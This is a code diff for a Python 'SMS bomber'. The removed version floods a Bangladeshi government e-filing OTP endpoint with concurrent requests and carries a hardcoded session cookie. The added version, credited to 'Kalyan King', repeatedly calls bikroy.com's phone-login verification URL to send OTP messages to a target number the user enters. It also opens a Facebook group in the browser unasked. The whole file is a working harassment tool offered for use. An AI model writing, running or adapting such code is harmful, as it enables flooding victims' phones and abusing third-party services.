@@ -1,57 +1,87 @@
-import asyncio
-import httpx
+#-------<$$ DAVLOPER :-- KALYAN KING ðŸ‘»$$$>----
+#-----<$$ TOOL :--- SMS BOMBERS $$$-->------
+import os
+import sys
+import json
+import uuid
+import string
+import random
+import requests
+import time
 
-# Function to send the request asynchronously
-async def send_request(client, url, headers, data, request_number):
-    try:
-        response = await client.post(url, headers=headers, data=data)
-        print(f"Request {request_number}: {response.status_code} - {response.text[:100]}")
-    except Exception as e:
-        print(f"Request {request_number} failed: {e}")
+#-----------<$$$ COLOR CODE $$$>----------
+RED = '\033[91m'
+GREEN = '\033[92m'
+YELLOW = '\033[93m'
+BLUE = '\033[94m'
+CYAN = '\033[96m'
+RESET = '\033[0m'
 
-# Main function to handle multiple requests
-async def send_multiple_requests(url, headers, data, num_requests):
-    async with httpx.AsyncClient() as client:
-        tasks = []
-        for i in range(num_requests):
-            task = send_request(client, url, headers, data, i + 1)
-            tasks.append(task)
+#------<$$$ Clear Screen Function $$$>-------
+def clear():
+    os.system('clear')
 
-        # Await all the tasks to send requests concurrently
-        await asyncio.gather(*tasks)
+clear()
 
-def main():
-    url = 'https://efiling.ebmeb.gov.bd/index.php/eiinsim/sendotp'
+#----------<$$$ Welcome Message $$$>---------
+print(f"{RED}============================================{RESET}")
+time.sleep(0.3)
+print(f"{GREEN}         WELCOME BRO!{RESET}")
+time.sleep(0.3)
+print(f"{YELLOW}       SMS BOMBER TOOL - {CYAN}KALYAN KING{RESET}")
+time.sleep(0.3)
+print(f"{RED}============================================{RESET}")
+time.sleep(0.3)
+print()
+print(f"{YELLOW}          Developed by: {YELLOW}Kalyan King{RESET}")
+time.sleep(0.3)
+print(f"{CYAN}          Use Responsibly!{RESET}")
+time.sleep(0.3)
+print(f"{GREEN}          Version {RESET} 0.1")
+time.sleep(0.3)
+print()
+os.system('espeak -a 150 "Welcome bro, SMS Bomber Tool, Kalyan King"')
+
+#-----------<$$$ Delay Before Banner $$$>-----------
+time.sleep(1)
+clear()
+#----------<$$$ Open Facebook GUROP $$$>------
+os.system(" xdg-open https://facebook.com/groups/1036123894351028/")
+os.system(" xdg-open https://facebook.com/groups/1036123894351028/")
+#-----------<$$$ ASCII Banner $$$>-----------
+banner = f"""{GREEN}
+   _____ __  ________    ____  ____  __  ___   
+  / ___//  |/  / ___/   / __ )/ __ \/  |/  /   
+  \__ \/ /|_/ /\__ \   / __  / / / / /|_/ /    
+ ___/ / /  / /___/ /  / /_/ / /_/ / /  / /     
+/____/_/  /_//____/  /_____/\____/_/  /_/      kalyan KING
+{RESET}"""
+print(banner)
+
+#-------------<$$$ Target Input $$$>-------------
+target = input(f"{CYAN}[+] Enter Target Number (880xxxxxxxxxx): {RESET}")
+limit = int(input(f"{CYAN}[+] Enter Number of SMS to Send: {RESET}"))
+
+#-------------<$$$ API Function $$$>-------------
+def send_sms_bikroy(number):
+    url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}"
     headers = {
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'cookie': 'ci_session=0665cd6ec60b91d5172234bfadd75973fdc518dd',
-        'origin': 'https://efiling.ebmeb.gov.bd',
-        'priority': 'u=1, i',
-        'referer': 'https://efiling.ebmeb.gov.bd/index.php/eiinsim/applicationform',
-        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest'
+        'User-Agent': 'Mozilla/5.0',
+        'Content-Type': 'application/json'
     }
+    try:
+        response = requests.get(url, headers=headers)
+        if response.status_code == 200:
+            print(f"{GREEN}[+] SMS Sent to {number}{RESET}")
+        else:
+            print(f"{RED}[-] Failed to Send SMS | Status Code: {response.status_code}{RESET}")
+    except Exception as e:
+        print(f"{RED}[-] Error: {e}{RESET}")
 
-    # Get mobile number from the user
-    mobile_number = input("On behalf of Siam Enter the mobile number: ")
+#-------------<$$$ SMS Bombing Loop $$$>-------------
+print(f"\n{YELLOW}[*] Starting SMS Bombing...{RESET}\n")
+for i in range(limit):
+    send_sms_bikroy(target)
+    time.sleep(1) 
 
-    data = {
-        'mobile': mobile_number
-    }
-
-    # Ask the user how many requests to send
-    num_requests = int(input("How many SMS do you want to send: "))
-
-    # Run the async loop to send multiple requests
-    asyncio.run(send_multiple_requests(url, headers, data, num_requests))
-
-if __name__ == "__main__":
-    main()
+print(f"\n{GREEN}[âœ“] Completed! Sent {limit} requests to {target}{RESET}")
